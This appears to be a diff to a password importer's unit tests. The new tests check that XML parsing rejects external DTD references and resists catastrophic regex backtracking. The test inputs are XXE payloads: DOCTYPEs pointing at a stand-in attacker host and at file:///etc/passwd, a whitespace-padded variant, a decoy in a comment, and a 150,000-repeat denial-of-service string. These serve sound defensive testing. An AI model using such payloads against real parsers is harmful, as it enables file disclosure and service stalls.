@@ -307,14 +307,53 @@ describe("BaseImporter class", () => {
       expect(result).toBe(null);
     });
 
-    it("parse XML should accept DOCTYPE with PUBLIC identifier (e.g. XHTML exports like Clipperz)", async () => {
-      // PUBLIC-only DOCTYPEs are used by XHTML exports; modern DOMParsers never fetch
-      // external DTDs from PUBLIC identifiers, so blocking them would break real imports.
+    // A PUBLIC ExternalID carries a mandatory SystemLiteral (XML 1.0 §2.8), so it supplies an
+    // attacker-controlled external DTD URL exactly as SYSTEM does. XHTML exports are handled by
+    // parseHtml instead, so rejecting PUBLIC here costs no real import.
+    it.each([
+      [
+        "http URL",
+        `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://evil.example.com/evil.dtd">`,
+      ],
+      ["file URL", `<!DOCTYPE passwordsafe PUBLIC "-//x//y//EN" "file:///etc/passwd">`],
+    ])("parse XML should reject DOCTYPE with external PUBLIC DTD reference (%s)", (_, doctype) => {
       const xml = `<?xml version="1.0" encoding="ISO-8859-1"?>
-        <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-        <html xmlns="http://www.w3.org/1999/xhtml"><body><textarea>[]</textarea></body></html>`;
+        ${doctype}
+        <passwordsafe delimiter=";"><entry><title>PoC</title></entry></passwordsafe>`;
+
+      expect(importer.parseXml(xml)).toBe(null);
+    });
+
+    // Whitespace between the name and the ExternalID is well-formed XML, so the guard must not
+    // bound how far it scans before the keyword.
+    it("parse XML should reject an external DTD reference padded with whitespace", () => {
+      const xml = `<!DOCTYPE passwordsafe ${" ".repeat(300)}SYSTEM "http://evil.example.com/evil.dtd">
+        <passwordsafe delimiter=";"><entry><title>PoC</title></entry></passwordsafe>`;
+
+      expect(importer.parseXml(xml)).toBe(null);
+    });
+
+    // Regression: a decoy DOCTYPE inside a leading comment must not shadow a later malicious one.
+    // Scanning only the first match would let this through.
+    it("parse XML should reject a malicious DOCTYPE preceded by a decoy", () => {
+      const xml = `<!-- <!DOCTYPE decoy> -->
+        <!DOCTYPE passwordsafe SYSTEM "http://evil.example.com/evil.dtd">
+        <passwordsafe delimiter=";"><entry><title>PoC</title></entry></passwordsafe>`;
+
+      expect(importer.parseXml(xml)).toBe(null);
+    });
+
+    // Regression: the guard used a variable-length gap followed by a keyword, which backtracks
+    // quadratically. 1.5MB of repeated "<!DOCTYPE " blocked the calling thread for ~109 seconds,
+    // and parseXml runs synchronously on the UI thread with no file size cap.
+    it("parse XML should reject a pathological DOCTYPE payload without stalling", () => {
+      const xml = "<!DOCTYPE ".repeat(150_000);
+
+      const start = Date.now();
       const result = importer.parseXml(xml);
-      expect(result).not.toBe(null);
+
+      expect(result).toBe(null);
+      expect(Date.now() - start).toBeLessThan(1000);
     });
 
     it("parse XML should accept DOCTYPE with internal subset only", async () => {
